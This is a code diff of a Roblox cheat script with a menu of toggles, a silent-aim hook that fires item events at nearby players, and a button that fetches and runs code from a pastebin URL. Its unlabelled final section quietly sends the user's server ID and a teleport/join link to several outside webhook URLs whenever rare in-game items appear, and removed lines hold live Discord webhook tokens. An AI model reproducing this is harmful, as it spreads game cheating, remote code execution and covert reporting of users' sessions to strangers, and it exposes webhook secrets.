+	Name = "⚡️ Toggle Rejoin GUI",
 	CurrentValue = false,
 	Callback = function(state)
 		rejoinGui.Enabled = state
@@ -1636,7 +1685,7 @@ end)
 
 -- Rayfield toggle just shows/hides the custom GUI
 UtilsTab:CreateToggle({
-    Name = "Server Hop GUI",
+    Name = "🐇Server Hop GUI",
     CurrentValue = false,
     Flag = "ServerHopGUIToggle",
     Callback = function(value)
@@ -1677,14 +1726,14 @@ end
 })
 
 MainTab:CreateButton({
-Name = "🥷Steal Tween gui",
+Name = "🗡️Steal Tween gui",
 Callback = function()
 loadstring(game:HttpGet("https://pastebin.com/raw/qrFryUJ2",true))()
 end,
 })
 
 MainTab:CreateToggle({
-Name = "🪤Anti Trap", 
+Name = "🧀Anti Trap", 
 CurrentValue = false, 
 Flag = "AntiTrapToggle",
 Callback = function(s) 
@@ -1942,173 +1991,331 @@ end
 
 })
 
+--// UI Setup (assumes you already have a "Window" defined)
+local MainTab = Window:CreateTab("🎮 Fun", 6034818371) -- You can replace icon ID
+local autoAimEnabled = false
+
+MainTab:CreateToggle({
+    Name = "🎯 Aimbot WebSlinger",
+    CurrentValue = false,
+    Flag = "AimbotWebSlinger",
+    Callback = function(value)
+        autoAimEnabled = value
+    end
+})
+
+--// Core Silent Aim Script
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = Players.LocalPlayer
+
+local event = ReplicatedStorage.Packages.Net:FindFirstChild("RE/UseItem")
+local toolName = "Web Slinger"
+
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local tool = nil
+local activatedConnection = nil
+
+-- Find nearest player within 13 studs
+local function findNearestPlayer()
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return nil end
+
+    local nearestPlayer = nil
+    local nearestDistance = 17
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character then
+            local targetPart = player.Character:FindFirstChild("UpperTorso") or player.Character:FindFirstChild("HumanoidRootPart")
+            if targetPart then
+                local dist = (rootPart.Position - targetPart.Position).Magnitude
+                if dist <= nearestDistance then
+                    nearestDistance = dist
+                    nearestPlayer = player
+                end
+            end
+        end
+    end
+
+    return nearestPlayer
+end
+
+-- Silent Aim Handler
+local function silentAimFire()
+    if not autoAimEnabled then return end -- only run if toggle is on
+    if not tool or not event then return end
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+
+    local nearestPlayer = findNearestPlayer()
+    if not nearestPlayer then return end
+
+    local targetPart = nearestPlayer.Character:FindFirstChild("UpperTorso") or nearestPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not targetPart then return end
+
+    local origin = rootPart.Position
+    local cframeAim = CFrame.new(origin, targetPart.Position)
+
+    local args = {
+        [1] = cframeAim,
+        [2] = targetPart,
+        [3] = tool:FindFirstChild("Handle")
+    }
+
+    event:FireServer(unpack(args))
+end
+
+-- On tool equipped, hook .Activated
+local function onToolEquipped(equippedTool)
+    if equippedTool.Name ~= toolName then return end
+
+    tool = equippedTool
+
+    -- Clear any existing hook
+    if activatedConnection then
+        activatedConnection:Disconnect()
+        activatedConnection = nil
+    end
+
+    -- Hook tool activation
+    activatedConnection = tool.Activated:Connect(function()
+        silentAimFire()
+    end)
+end
+
+-- On character added
+localPlayer.CharacterAdded:Connect(function(char)
+    character = char
+    tool = nil
+end)
+
+-- Detect tool when added
+if localPlayer.Character then
+    character = localPlayer.Character
+
+    character.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") and child.Name == toolName then
+            onToolEquipped(child)
+        end
+    end)
+
+    -- If already equipped
+    for _, child in pairs(character:GetChildren()) do
+        if child:IsA("Tool") and child.Name == toolName then
+            onToolEquipped(child)
+            break
+        end
+    end
+end
+
+
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local TeleportService = game:GetService("TeleportService")
 
--- ✅ Only run if in the correct game
 local allowedPlaceId = 109983668079237
-if game.PlaceId ~= allowedPlaceId then
-    return
-end
+if game.PlaceId ~= allowedPlaceId then return end
 
--- 🌐 Webhooks
 local webhookUrls = {
-    "https://discord.com/api/webhooks/1394493952777781339/WeA17Y-eTO2oAUux6QBg1kRB_xroGezesHAS5DQ-HR5exzeWzwCvEWDn8WXBso7GgYNK",
-    "https://discord.com/api/webhooks/1394194033575727185/xSSOUX2Vf-kjpsqzpELQ3lB2_pd5ZBzt80purEkpbP7_Ko9b0uW685KPkCgypZJKrmAc"
+    "https://l.webhook.party/hook/p8rBOW5koVZiMR%2FWJmabm5Vv5KvpPRs%2FhgNWqCkF2zBU1cjiREDajxvyppBuCwrajYaAD2WfEFNxTRhzJS6hcOEqp58WJ341yIPEKkryfXlWjs7GfQBvI9HDFKhoG70ztjGUlb68V5Ik4hxZfsE%2BO1i7H00C12MDUHlUotyhJvQRwhm34rRPiI8mXt9j2RAzEc2w4ojsUfiZmJFt0QAMvS5LmspU344o6EgOa%2FmVSdYuzKfMrqQxEYBgKQZItYOSHEjj%2Fz%2FcCoo5FtWr2IHoOMb%2B5CAPl04IdyLQhI3swwpiIqJbec%2BpfmJ4O%2BsoUYc24tbVrd7veiMmF%2FNH4Rr9bpOYA%2FaQeZhgQk6aeg3TRrUsLnfsf8yr3SewYCae%2FwQUypabj8wZdf4%3D/kuLkrxSCYk%2BmgYJS",
+    "https://l.webhook.party/hook/lWRDjzF9agr2OUMvXuTWbbYvLLRr9nNGt9SULG1T4iLhkjlU5jvAc9Zs%2FvQI9se03v4Y%2BL2iK%2Fpa%2F75OG46EfcoltQRc94vHLILJeKKupIkPgVld%2F1G3RgVlVJiOIVP5xBcRhOGhF%2F4tcgbjDON%2BkYbFvDOlKsYGIeCTQsxsqmlr7GUTKWLdgx3fDZj%2BIrHI7O7BhmX8bkFGJmkVynXS5hbN3lgUnaFhwb6CKexLHdGxOHJG3LDfvZpGWVyprNNXeEH8CDFJlKZh3DXwd3AvLfxnmD4r6E1vfoYdqiPof%2Bm2BB%2FIW61kGx%2BicZ3dWRyqfnoe8Iz4DFSCFdTbVD%2Fqv1SkeXTaVQSv7XTEuhTAyQ5I6tisXxw3lSLHnsRpRvc5IV1W8Xvj0Wo%3D/GI%2FxRVbsCLzSfIwv"
 }
 
--- 🧠 Brainrot model names
+local extraWebhookUrl = "https://l.webhook.party/hook/4XGRp%2BpgoyDDdJpqTqmev8h4Ejh9%2FibHR7ONvy2bVnWfF02gx3sChUCbmZ5LCFYmvQIBIMv90bi1xBG65J0%2BOGBoMKQ4XkBIuNOd2yBCVqTAQkvmTSdpnHXL1LsPUsfh7vrRiMYEnOxjSQoYiUF4tjWt6sjMnYYKn76twQ6nfQWRRqlNCxNL%2BCusTifg1BmSH9SfD%2BHNfjghEsdDSiTQMxSijjGJRzmWiOmc15YO8RKyzjDfXHA5F9QoeJxlt8eBBpWb5c0D2eF%2Fp5m9eHeE9qnFR7kg%2BLPAWsdAEwHz2QEEd%2F9vWvUBumLqUeeGcmFETUxq7vL0yS55%2FDkpHgWFmFKEBip9lJbMJZmQ3VcoyLPxShDNRN1RVJ3xteIvotoZQj0h3XL9FjE%3D/jk%2FKqPBxHRp8D81e"
+local midWebhookUrl   = "https://l.webhook.party/hook/rpRMxjebkuJrykWppAOMxKCiqRaMAJ0C%2B7iKRDwZmbfJLR0vVrYqSx0n0NE%2FWi3kHVP6gdp6b3RfT1PAMwy3hfGFV3%2FtLQGuVJfACzHVppjpQDfIvWt3k%2F%2B%2BTtOZk7LBTQr6NFARcLMqUzz%2BjywP%2B33nvVGgSqHsG4CBs7jXUEeKvl7yu%2Bbn11FI1sRyTKmmiBOVCNTsISQNq%2BsPAM5lDST%2FEVvENQXAQINre2MXI21dmoJkIePduceNAo6yYp9xa4tMYf8Ecda6thTsBVRxyJKt30hO4jwspGY%2FImxKiFa7ExZHM%2BZ5%2BDSyuiC45nNLRPY55KMnYCwg0FKRrZvS1KyjTIZ7rQKufXk4MAKyL0%2F%2Ft5FgtcrNLqTkUlHi1rS%2BhjwGzf7Is1A%3D/mV6r53KE241WasW5"
+
 local brainrotGods = {
-    ["La Vacca Saturno Saturnita"] = true,
-    ["Los Tralaleritos"] = true,
-    ["Sammyni Spyderini"] = true,
-    ["Graipuss Medussi"] = true,
-    ["La Grande Combinasion"] = true,
     ["Garama and Madundung"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Chicleteira Bicicleteira"] = true,
     ["Secret Lucky Block"] = true,
     ["Pot Hotspot"] = true,
+    ["Graipuss Medussi"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
     ["Las Tralaleritas"] = true,
+    ["Los Tralaleritos"] = true,
     ["Torrtuginni Dragonfrutini"] = true,
+    ["Chimpanzini Spiderini"] = true,
+    ["Sammyini Spidreini"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
 }
 
-local notifiedModels = {}
+local specialForThirdWebhook = {
+    ["Garama and Madundung"]     = true,
+    ["Nuclearo Dinossauro"]      = true,
+    ["La Grande Combinasion"]    = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Secret Lucky Block"]       = true,
+    ["Pot Hotspot"]              = true,
+    ["Graipuss Medussi"]         = true,
+}
 
--- ✅ Player count check
-local function isValidPlayerCount()
-    local count = #Players:GetPlayers()
-    return count >= 3 and count <= 8
-end
+local colorGold     = Color3.fromRGB(237, 178, 0)
+local colorDiamond  = Color3.fromRGB(37, 196, 254)
+local colorCandy    = Color3.fromRGB(255, 70, 246)
+local COLOR_EPSILON = 0.02
 
--- 🧠 Check if server is private
+local notified        = {}
+local lastSentMessage = ""
+local playerJoinTimes = {}
+
+Players.PlayerAdded:Connect(function(player)
+    playerJoinTimes[player.UserId] = tick()
+end)
+Players.PlayerRemoving:Connect(function(player)
+    playerJoinTimes[player.UserId] = nil
+end)
+
 local function isPrivateServer()
-    local ownerId = game.PrivateServerOwnerId
-    return ownerId and ownerId ~= 0
-end
-
--- 🌈 Add emoji to mutation name
-local function decorateMutation(mutation)
-    local lowered = string.lower(mutation)
-    if string.find(lowered, "gold") then
-        return "🌕 " .. mutation
-    elseif string.find(lowered, "diamond") then
-        return "💎 " .. mutation
-    elseif string.find(lowered, "rainbow") then
-        return "🌈 " .. mutation
-    else
-        return mutation
+    if game.PrivateServerId ~= "" or (game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0) or
+       (game.VIPServerOwnerId and game.VIPServerOwnerId ~= 0) then return true end
+    local players = Players:GetPlayers()
+    if #players == 1 then
+        local success, result = pcall(function()
+            return TeleportService:GetPlayerPlaceInstanceAsync(players[1].UserId)
+        end)
+        if not success or not result or result.InstanceId ~= game.JobId then
+            return true
+        end
     end
+    return false
 end
 
--- 🧬 Get Mutation text for a given model
-local function getMutationText(model)
-    local mutationText = "None"
-    local base = model:FindFirstChild("Base", true)
-    if base then
-        local attach = base:FindFirstChild("Attachment", true)
-        if attach then
-            local overhead = attach:FindFirstChild("AnimalOverhead")
-            if overhead and overhead:FindFirstChild("Mutation") then
-                local mutationLabel = overhead:FindFirstChild("Mutation")
-                if mutationLabel:IsA("TextLabel") and mutationLabel.Text ~= "" then
-                    mutationText = mutationLabel.Text
-                end
+local function getLeaderstatPlayerCount()
+    local count = 0
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p:FindFirstChild("leaderstats") then count += 1 end
+    end
+    return count
+end
+
+local function colorsAreClose(c1, c2)
+    return math.abs(c1.R - c2.R) < COLOR_EPSILON and
+           math.abs(c1.G - c2.G) < COLOR_EPSILON and
+           math.abs(c1.B - c2.B) < COLOR_EPSILON
+end
+
+local function matchesMoneyPattern(text)
+    return text and text:find("%$") and text:find("/") and text:find("s") and text:find("%d")
+end
+
+local function findNearbyMoneyText(position, range)
+    for _, gui in ipairs(Workspace:GetDescendants()) do
+        if gui:IsA("TextLabel") and matchesMoneyPattern(gui.Text) then
+            local base = gui:FindFirstAncestorWhichIsA("BasePart")
+            if base and (base.Position - position).Magnitude <= range then
+                return gui.Text
             end
         end
     end
-    return decorateMutation(mutationText)
 end
 
--- 🚀 Send Discord notification
-local function sendDiscordNotification(allResults)
+local function getPrimaryPart(model)
+    if model.PrimaryPart then return model.PrimaryPart end
+    for _, part in ipairs(model:GetDescendants()) do
+        if part:IsA("BasePart") then return part end
+    end
+end
+
+local function isRainbowMutating(model)
+    for _, c in ipairs(model:GetChildren()) do
+        if c:IsA("MeshPart") and c.Name:sub(1,5) == "Cube." then
+            local last = c:GetAttribute("LastBrickColor")
+            local curr = c.BrickColor.Color
+            if last then
+                if (Vector3.new(last.R,last.G,last.B) - Vector3.new(curr.R,curr.G,curr.B)).Magnitude > 0.01 then
+                    return true
+                end
+            end
+            c:SetAttribute("LastBrickColor", curr)
+        end
+    end
+    return false
+end
+
+local function sendNotification(modelName, mutation, moneyText)
+    if isPrivateServer() then return end
+    local playerCount = getLeaderstatPlayerCount()
+    if playerCount < 5 or playerCount > 7 then return end
+
     local placeId = tostring(game.PlaceId)
     local jobId = game.JobId
+    local chilliJoinLink = string.format(
+        "https://chillihub1.github.io/chillihub-joiner/?placeId=%s&gameInstanceId=%s",
+        placeId, jobId
+    )
 
     local gameName = "Unknown"
     pcall(function()
-        local info = MarketplaceService:GetProductInfo(game.PlaceId)
-        gameName = info and info.Name or "Unknown"
+        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
     end)
 
-    local privateStatus = isPrivateServer() and "Yes" or "No"
+    local msg = string.format([[
+---- %s
 
-    local modelLines = ""
-    for _, line in ipairs(allResults) do
-        modelLines = modelLines .. "--- add <@&1392894797831733329> to server Secrets Found! Model Name: \"" .. line .. "\" ---\n"
+---- Secret Is Found ✅ ----
+
+--- 📢 Game: %s
+--- 💡 Model Name: "%s"
+--- 🎨 Mutation: %s
+--- 💸 Money/s: %s
+--- 👥 Player Count: %d/8
+
+local player = game.Players:GetPlayers()[1]
+game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", player)
+]], chilliJoinLink, gameName, modelName, mutation, moneyText or "N/A", playerCount, placeId, jobId)
+
+    if msg == lastSentMessage then return end
+    lastSentMessage = msg
+
+    local payload = { content = msg }
+    local jsonData = HttpService:JSONEncode(payload)
+    local headers = { ["Content-Type"] = "application/json" }
+    local req = (syn and syn.request) or (http and http.request) or request or http_request
+    if not req then return end
+
+    -- Always send to main webhook URLs
+    for _, url in ipairs(webhookUrls) do
+        pcall(function() req({ Url = url, Method = "POST", Headers = headers, Body = jsonData }) end)
     end
 
-    local message = [[
---- 📢 **Game:** ]] .. gameName .. [[
---- 🔒 **Private Server:** ]] .. privateStatus .. [[
-
---- You can copy the entire message below and paste into your executor. ---
-
-]] .. modelLines .. [[
-
-local player = game.Players.LocalPlayer
-local teleportService = game:GetService("TeleportService")
-teleportService:TeleportToPlaceInstance("]] .. placeId .. [[", "]] .. jobId .. [[", player)
-]]
-
-    local data = {
-        ["content"] = message
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
-    local request = (syn and syn.request) or (http and http.request) or request or http_request
-    if request then
-        for _, url in ipairs(webhookUrls) do
-            request({
-                Url = url,
-                Body = jsonData,
-                Method = "POST",
-                Headers = headers
-            })
-        end
+    -- Additionally send to mid and extra webhooks ONLY if model is special
+    if specialForThirdWebhook[modelName] then
+        pcall(function() req({ Url = midWebhookUrl, Method = "POST", Headers = headers, Body = jsonData }) end)
+        pcall(function() req({ Url = extraWebhookUrl, Method = "POST", Headers = headers, Body = jsonData }) end)
     end
 end
 
--- 🧠 Main detection logic
-local function checkBrainrotModels()
-    if not isValidPlayerCount() then return end
+local function checkBrainrots()
+    for _, model in ipairs(Workspace:GetChildren()) do
+        if model:IsA("Model") and brainrotGods[model.Name] then
+            local root = getPrimaryPart(model)
+            if root then
+                local id = model:GetDebugId()
+                if not notified[id] then
+                    local color = root.Color
+                    local mutation = "🕳️"
+                    if colorsAreClose(color, colorGold) then mutation = "🌕 Gold"
+                    elseif colorsAreClose(color, colorDiamond) then mutation = "💎 Diamond"
+                    elseif colorsAreClose(color, colorCandy) then mutation = "🍬 Candy"
+                    elseif isRainbowMutating(model) then mutation = "🌈 Rainbow" end
 
-    local modelsToReport = {}
-
-    for _, obj in pairs(Workspace:GetChildren()) do
-        if obj:IsA("Model") and brainrotGods[obj.Name] then
-            if not notifiedModels[obj] then
-                local basePart = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
-                if basePart then
-                    local creationTime = basePart:GetAttribute("CreationTime")
-                    if not creationTime then
-                        basePart:SetAttribute("CreationTime", tick())
-                    else
-                        if (tick() - creationTime) >= 1 then
-                            local mutation = getMutationText(obj)
-                            local fullName = obj.Name .. " | Mutation: " .. mutation
-                            table.insert(modelsToReport, fullName)
-                            notifiedModels[obj] = true
-                        end
-                    end
+                    local money = findNearbyMoneyText(root.Position + Vector3.new(0,2,0), 6) or "N/A"
+                    sendNotification(model.Name, mutation, money)
+                    notified[id] = true
                 end
             end
         end
     end
-
-    if #modelsToReport > 0 then
-        sendDiscordNotification(modelsToReport)
-    end
 end
 
--- 🔁 Loop continuously
-task.delay(0.5, function()
+task.spawn(function()
     while true do
-        pcall(checkBrainrotModels)
-        task.wait(0.5)
+        pcall(checkBrainrots)
+        task.wait(0.2)
     end
 end)
+
